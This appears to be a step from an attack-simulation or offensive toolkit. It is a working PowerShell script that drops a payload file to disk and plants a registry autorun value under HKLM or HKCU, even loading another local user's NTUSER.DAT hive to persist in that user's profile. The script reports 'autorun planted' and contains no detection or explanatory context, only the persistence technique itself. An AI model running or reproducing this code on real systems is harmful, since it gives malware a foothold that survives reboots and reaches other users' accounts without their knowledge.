script:
if (-not $KEY -or -not $VALUE_NAME -or -not $VALUE_DATA) { throw 'KEY, VALUE_NAME and VALUE_DATA are required' }
$hiveName = if ($HIVE) { $HIVE.ToUpper() } else { 'HKLM' }
if ($PAYLOAD_PATH -and $PAYLOAD_BODY) {
    New-Item -ItemType Directory -Force -Path (Split-Path -Parent $PAYLOAD_PATH) | Out-Null
    Set-Content -LiteralPath $PAYLOAD_PATH -Value $PAYLOAD_BODY -Encoding ascii
}
if ($hiveName -eq 'HKLM') {
    $keyPath = "HKLM:\$KEY"
    if (-not (Test-Path -LiteralPath $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
    New-ItemProperty -LiteralPath $keyPath -Name $VALUE_NAME -Value $VALUE_DATA -PropertyType String -Force | Out-Null
    Write-Output "autorun planted: HKLM\$KEY\$VALUE_NAME"
} elseif ($hiveName -eq 'HKCU') {
    if ($USERNAME) {
        $u = Get-CimInstance Win32_UserAccount -Filter "LocalAccount=True AND Name='$USERNAME'" -ErrorAction Stop
        if ($null -eq $u) { throw "local user not found: $USERNAME" }
        $sid = $u.SID
        $root = "Registry::HKEY_USERS\$sid"
        $mounted = $false
        if (-not (Test-Path -LiteralPath $root)) {
            $hiveFile = "C:\Users\$USERNAME\NTUSER.DAT"
            if (-not (Test-Path -LiteralPath $hiveFile)) { throw "user hive not found: $hiveFile" }
            & reg.exe load 'HKU\HuitzPlant' $hiveFile | Out-Null
            if ($LASTEXITCODE -ne 0) { throw "reg load failed: $hiveFile" }
            $root = 'Registry::HKEY_USERS\HuitzPlant'
            $mounted = $true
        }
        try {
            $keyPath = "$root\$KEY"
            if (-not (Test-Path -LiteralPath $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
            New-ItemProperty -LiteralPath $keyPath -Name $VALUE_NAME -Value $VALUE_DATA -PropertyType String -Force | Out-Null
        } finally {
            if ($mounted) { & reg.exe unload 'HKU\HuitzPlant' | Out-Null }
        }
        Write-Output "autorun planted: HKU\$sid\$KEY\$VALUE_NAME"
    } else {
        $keyPath = "HKCU:\$KEY"
        if (-not (Test-Path -LiteralPath $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
        New-ItemProperty -LiteralPath $keyPath -Name $VALUE_NAME -Value $VALUE_DATA -PropertyType String -Force | Out-Null
        Write-Output "autorun planted: HKCU\$KEY\$VALUE_NAME"
    }
} else {
    throw "HIVE must be HKLM or HKCU, got $HIVE"
}
